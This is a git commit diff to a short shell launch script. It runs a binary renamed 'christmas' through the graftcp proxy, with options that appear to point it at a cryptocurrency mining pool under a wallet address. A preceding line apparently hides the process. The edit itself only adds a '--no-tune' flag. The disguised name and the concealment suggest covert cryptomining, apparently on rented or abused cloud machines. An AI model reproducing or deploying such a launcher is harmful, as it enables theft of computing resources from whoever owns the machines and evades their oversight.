53c5f8ff2727fab0ddd76feec928ea9064b9d7e8
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2022-01-02 22:57:08 +0200

    Update start_Xmas_AzAz3_ws1.sh

--- start_Xmas_AzAz3_ws1.sh
+++ start_Xmas_AzAz3_ws1.sh
@@ -45,4 +45,4 @@ chmod +x christmas
 
 ph add christmas
 
-./graftcp/graftcp ./christmas -a gr -o raptorna.011data.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz3 -p IhatePopUps
+./graftcp/graftcp ./christmas -a gr -o raptorna.011data.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz3 -p IhatePopUps --no-tune
